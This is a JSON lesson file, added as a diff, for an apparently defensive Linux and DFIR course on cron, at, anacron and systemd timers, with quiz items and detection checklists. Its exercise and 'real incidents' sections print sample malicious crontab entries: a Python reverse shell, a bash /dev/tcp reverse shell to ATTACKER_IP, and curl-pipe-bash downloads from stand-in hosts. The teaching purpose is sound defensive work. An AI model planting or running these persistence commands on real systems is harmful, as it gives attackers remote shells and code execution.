@@ -1,0 +1,164 @@
+{
+  "lesson_id": "e1c7f5a6-b8d9-4e0f-3a2b-5c6d7e8f9a01",
+  "domain": "linux",
+  "title": "Linux Job Scheduling (cron, at)",
+  "difficulty": 2,
+  "order_index": 48,
+  "prerequisites": ["Linux Process Management (ps, top, kill)"],
+  "concepts": [
+    "cron daemon and crontab",
+    "cron expression syntax",
+    "at and batch commands",
+    "anacron for non-continuous systems",
+    "systemd timers as cron alternative",
+    "scheduled task persistence mechanisms",
+    "cron security implications",
+    "log rotation with cron",
+    "environment variables in cron",
+    "cron logging and debugging"
+  ],
+  "estimated_time": 45,
+  "learning_objectives": [
+    "Configure cron jobs using crontab with proper timing syntax",
+    "Use at and batch for one-time scheduled tasks",
+    "Understand anacron's role for systems that aren't always on",
+    "Identify malicious cron jobs used for persistence by adversaries",
+    "Troubleshoot common cron issues including environment and path problems"
+  ],
+  "post_assessment": [
+    {
+      "question": "What does the cron expression '0 2 * * 6' mean?",
+      "options": [
+        "Every Saturday at 2:00 AM",
+        "Every 2 hours on the 6th day of the month",
+        "Every 6 minutes at 2:00 AM",
+        "Every day at 2:06 AM"
+      ],
+      "correct": 0,
+      "explanation": "Cron format is: minute hour day-of-month month day-of-week. '0 2 * * 6' means minute=0, hour=2, any day of month, any month, day-of-week=6 (Saturday)."
+    },
+    {
+      "question": "An attacker adds a cron job to a compromised system. Which crontab location would give them PERSISTENCE across reboots for ALL users?",
+      "options": [
+        "~/.crontab",
+        "/etc/crontab",
+        "/var/spool/cron/",
+        "/tmp/schedule"
+      ],
+      "correct": 1,
+      "explanation": "/etc/crontab is the system-wide crontab that executes regardless of which users log in. It persists across reboots and affects the entire system, making it a prime persistence mechanism."
+    },
+    {
+      "question": "Why might a cron job work when run manually from the shell but fail when run by cron?",
+      "options": [
+        "Cron uses UTC timezone while the shell uses local time",
+        "Cron provides a minimal environment without the user's shell profile",
+        "Cron requires root privileges for all jobs",
+        "Cron can only run shell scripts, not binaries"
+      ],
+      "correct": 1,
+      "explanation": "Cron runs jobs with a minimal environment — no .bashrc, .bash_profile, or other shell initialization files. This means PATH, environment variables, and aliases from the user's shell are missing, causing commands to fail."
+    },
+    {
+      "question": "Which command schedules a one-time task to run at 3:00 AM tomorrow?",
+      "options": [
+        "cron -t '0 3 * * *' command",
+        "echo 'command' | at 3:00 AM tomorrow",
+        "batch -t 3:00 command",
+        "schedule --at '3:00 AM tomorrow' command"
+      ],
+      "correct": 1,
+      "explanation": "The 'at' command is used for one-time scheduled tasks. 'echo \"command\" | at 3:00 AM tomorrow' schedules the command to run once at the specified time."
+    },
+    {
+      "question": "What is the key difference between anacron and cron?",
+      "options": [
+        "anacron runs jobs every minute while cron has minimum 1-hour intervals",
+        "anacron catches up on missed jobs if the system was down, cron does not",
+        "anacron requires root privileges while cron works for all users",
+        "anacron uses different syntax for scheduling"
+      ],
+      "correct": 1,
+      "explanation": "anacron is designed for systems that aren't always on. If a scheduled job was supposed to run while the system was powered off, anacron will run it when the system boots. cron simply skips missed jobs."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Active Recall",
+    "Spaced Repetition",
+    "Visualization",
+    "Association",
+    "Chunking",
+    "Mnemonics",
+    "Teach It Back",
+    "Emotional Connection",
+    "Simplify",
+    "Focus and Eliminate Distractions"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Why Scheduling Matters for Security",
+      "content": "Every Linux system runs scheduled tasks — and attackers love them. Cron jobs are one of the TOP persistence mechanisms used in real intrusions. Understanding scheduling isn't just a sysadmin skill; it's a DFIR essential. When you respond to an incident, one of the first things you check is: \"What's scheduled to run?\" Master this, and you'll find backdoors others miss.",
+      "duration_minutes": 2
+    },
+    {
+      "type": "explanation",
+      "title": "Cron: The Time-Based Job Scheduler",
+      "content": "**Cron** is Linux's built-in scheduler for recurring tasks, managed by the cron daemon (crond).\n\n**Crontab Syntax (5 fields + command):**\n```\n┌──────── minute (0-59)\n│ ┌────── hour (0-23)\n│ │ ┌──── day of month (1-31)\n│ │ │ ┌── month (1-12)\n│ │ │ │ ┌ day of week (0-7, 0 and 7 = Sunday)\n│ │ │ │ │\n* * * * * command\n```\n\n**Common Patterns:**\n- `*/5 * * * *` — Every 5 minutes\n- `0 * * * *` — Every hour\n- `0 2 * * *` — Every day at 2 AM\n- `0 2 * * 0` — Every Sunday at 2 AM\n- `0 0 1 * *` — First day of every month\n\n**Crontab Management:**\n- `crontab -e` — Edit your crontab\n- `crontab -l` — List your crontab\n- `crontab -r` — Remove your crontab\n- `crontab -u user -l` — List another user's crontab (root)\n\n**System Crontab Locations:**\n- `/etc/crontab` — System-wide crontab (includes user field)\n- `/etc/cron.d/` — Drop-in cron files\n- `/etc/cron.hourly/`, `daily/`, `weekly/`, `monthly/` — Predefined intervals\n- `/var/spool/cron/crontabs/` — Per-user crontabs\n\n**Special Strings:**\n- `@reboot` — Run once at startup\n- `@yearly`/`@annually` — Once a year (0 0 1 1 *)\n- `@monthly` — Once a month (0 0 1 * *)\n- `@weekly` — Once a week (0 0 * * 0)\n- `@daily`/`@midnight` — Once a day (0 0 * * *)\n- `@hourly` — Once an hour (0 * * * *)",
+      "duration_minutes": 10
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Cron Scheduling",
+      "content": "Imagine you have a robot helper that can do chores on a schedule.\n\n**Cron** is like giving the robot a list of chores with times:\n- \"Every morning at 6:00, feed the cat\" → `0 6 * * *`\n- \"Every Sunday at noon, water the plants\" → `0 12 * * 0`\n- \"Every 15 minutes, check if the mail arrived\" → `*/15 * * * *`\n\nThe five numbers are like: **Minute Hour Day Month Weekday**\n\n**at** is like telling the robot: \"Do this ONE thing at 3 PM tomorrow, then forget about it.\"\n\n**anacron** is for robots that sometimes take naps (laptops that get turned off). If a chore was supposed to happen while napping, anacron says: \"Do it as soon as you wake up!\"\n\n**The security part:** Bad guys sometimes sneak chores onto your robot's list. Like: \"Every midnight, send my boss a copy of all passwords.\" You need to check the list regularly!",
+      "duration_minutes": 4
+    },
+    {
+      "type": "code_exercise",
+      "title": "Reading and Analyzing Crontab Entries",
+      "content": "Analyze the following crontab entries found on a compromised server. For each, identify: timing, command, and whether it's suspicious:\n\n```bash\n# Found in /etc/crontab\n0 3 * * * root /usr/local/bin/backup.sh\n\n# Found in /var/spool/cron/crontabs/www-data\n*/10 * * * * /usr/bin/curl -s http://10.0.0.99/update.sh | bash\n\n# Found in /etc/cron.d/maintenance\n0 0 * * 0 root /opt/scripts/cleanup_logs.sh\n\n# Found in root's crontab\n@reboot /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Found in /etc/cron.d/tomcat\n0 4 * * * tomcat /opt/tomcat/bin/catalina.sh cleanup\n```\n\n**Questions:**\n1. Which entry is a reverse shell? When does it run?\n2. Which entry downloads and executes remote code? How often?\n3. Which legitimate-looking entry is suspicious because it deletes logs?\n4. What indicator in entry 2 makes it clearly malicious?\n\n```python\n# Analysis:\nanalysis = {\n    \"entry_1\": \"Legitimate - daily backup at 3 AM\",\n    \"entry_2\": \"MALICIOUS - curl pipe bash every 10 min from suspicious IP\",\n    \"entry_3\": \"SUSPICIOUS - weekly log cleanup could be anti-forensics\",\n    \"entry_4\": \"MALICIOUS - reverse shell on @reboot (persistence)\",\n    \"entry_5\": \"Legitimate - Tomcat cleanup nightly at 4 AM\"\n}\n```",
+      "duration_minutes": 12
+    },
+    {
+      "type": "real_world",
+      "title": "Cron Persistence in Real Incidents",
+      "content": "Attackers frequently abuse cron for persistence:\n\n**Technique 1: @reboot Reverse Shell**\n```bash\n# Added to /etc/crontab or user crontab\n@reboot /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n```\n- Survives reboots, ensures C2 connectivity\n- Common in Linux IoT malware\n\n**Technique 2: Curl Pipe Bash**\n```bash\n*/5 * * * * curl -s http://c2.example.com/shell.sh | bash\n```\n- Downloads fresh payload every 5 minutes\n- Allows attacker to change commands without re-compromising\n\n**Technique 3: Legitimate-Looking Names**\n```bash\n# Hidden in /etc/cron.d/kernel-update\n0 * * * * root /dev/shm/.kupdate\n```\n- Mimics system process names\n- Uses hidden directories (/dev/shm, /tmp)\n\n**Technique 4: Systemd Timer (Cron Alternative)**\n```ini\n# /etc/systemd/system/update.timer\n[Unit]\nDescription=System Update\n[Timer]\nOnCalendar=*:0/5\n[Install]\nWantedBy=timers.target\n```\n- Modern attackers increasingly use systemd timers\n- Less monitored than cron by many DFIR teams\n\n**Detection:** Always check all crontab sources, systemd timers, and compare against known-good baselines.",
+      "duration_minutes": 8
+    },
+    {
+      "type": "memory_aid",
+      "title": "Cron Syntax and DFIR Cheat Sheet",
+      "content": "**Cron 5-field mnemonic: \"Minute Hour Day Month Weekday\"**\n- Think: **M**y **H**uge **D**og **M**akes **W**eird noises\n- Or simply: **M**inute **H**our **D**ay **M**onth **W**eekday\n\n**Quick reference:**\n- `*` = every (any value)\n- `*/N` = every Nth\n- `1,3,5` = list (1, 3, and 5)\n- `1-5` = range (1 through 5)\n\n**DFIR Cron Check List — C-R-O-N-S:**\n- **C**rontab files: `/var/spool/cron/`, `crontab -l -u <user>`\n- **R**oot crontab: `crontab -l -u root`\n- **O**ther locations: `/etc/cron.d/`, `/etc/crontab`, `/etc/cron.*`\n- **N**ew entries: Compare against baseline\n- **S**ystemd timers: `systemctl list-timers --all`\n\n**At vs Cron:**\n- **at** = one-time future task (like setting an alarm)\n- **cron** = recurring schedule (like a daily alarm)\n- **anacron** = catch-up schedule (like a snooze button for missed alarms)",
+      "duration_minutes": 4
+    },
+    {
+      "type": "reflection",
+      "title": "Auditing Your System's Scheduled Tasks",
+      "content": "Run these commands on a Linux system you manage:\n\n1. `crontab -l` — What's in YOUR crontab?\n2. `sudo crontab -u root -l` — What does root schedule?\n3. `ls -la /etc/cron.d/` — Are there unexpected system cron jobs?\n4. `ls -la /etc/cron.daily/ /etc/cron.hourly/` — What runs periodically?\n5. `systemctl list-timers --all` — What systemd timers exist?\n6. `cat /var/log/cron` or `journalctl -u cron` — What has cron been running?\n\n**Write down:** Any entry you can't explain. Investigate it. Is it legitimate? When was it created? (`stat /etc/cron.d/filename` shows timestamps).\n\n**Action item:** Create a baseline of all scheduled tasks on your systems. Compare weekly.",
+      "duration_minutes": 5
+    },
+    {
+      "type": "mindset_coach",
+      "title": "From Scheduler to Hunter",
+      "content": "Understanding cron and scheduling is a two-way street:\n\n**As an administrator:** You use cron to automate maintenance, backups, and monitoring.\n\n**As a DFIR analyst:** You hunt for malicious cron entries because attackers use them for persistence.\n\n**Your progression:**\n- 🔰 Know cron syntax and can schedule tasks\n- 🎯 Can identify suspicious cron entries during investigations\n- 🚀 Build automated detection that baselines and alerts on new cron entries\n\nThe best analysts don't just react — they baseline, monitor, and detect. Every unexpected cron job is either a misconfiguration or a compromise. Know which.",
+      "duration_minutes": 2
+    },
+    {
+      "type": "explanation",
+      "title": "At, Batch, and Anacron",
+      "content": "**at — One-Time Scheduling:**\n```bash\n# Schedule a command for specific time\necho '/opt/backup.sh' | at 3:00 AM tomorrow\nat 10:00 PM Dec 31 <<< 'echo \"Happy New Year\" | wall'\n\n# List pending at jobs\natq\n\n# View details of a specific job\nat -c <job_number>\n\n# Remove a pending job\natrm <job_number>\n```\n\n**batch — Run When Load Is Low:**\n```bash\n# Run when system load drops below 0.8\necho 'make build' | batch\n\n# Custom load threshold\nbatch <<< 'make build'  # Uses default loadavg of 0.8\n```\n\n**anacron — For Systems That Aren't Always On:**\n```bash\n# /etc/anacrontab format:\n# period  delay  job-identifier  command\n1       5      cron.daily      run-parts /etc/cron.daily\n7       10     cron.weekly     run-parts /etc/cron.weekly\n30      15     cron.monthly    run-parts /etc/cron.monthly\n```\n\nKey anacron features:\n- Runs jobs that were missed while the system was down\n- Uses timestamps in `/var/spool/anacron/` to track last run\n- The `delay` field adds a random wait (prevents thundering herd)\n- Perfect for laptops and desktops that aren't 24/7\n\n**Cron Environment Gotchas:**\n1. **Minimal PATH:** Cron provides `/usr/bin:/bin` only. Always use full paths or set PATH in the crontab.\n2. **No shell profile:** `.bashrc` and `.bash_profile` are NOT sourced.\n3. **Different working directory:** Default is the user's home directory.\n4. **Output handling:** Unredirected output is emailed to the user. Always redirect: `command >> /var/log/myjob.log 2>&1`\n5. **Environment variables:** Set them in the crontab or script: `SHELL=/bin/bash`",
+      "duration_minutes": 8
+    }
+  ],
+  "tags": [
+    "Course: SANS-SEC406",
+    "Career Path: Blue Teamer",
+    "Career Path: DFIR Specialist",
+    "cron",
+    "at",
+    "anacron",
+    "linux",
+    "persistence",
+    "scheduling"
+  ]
+}
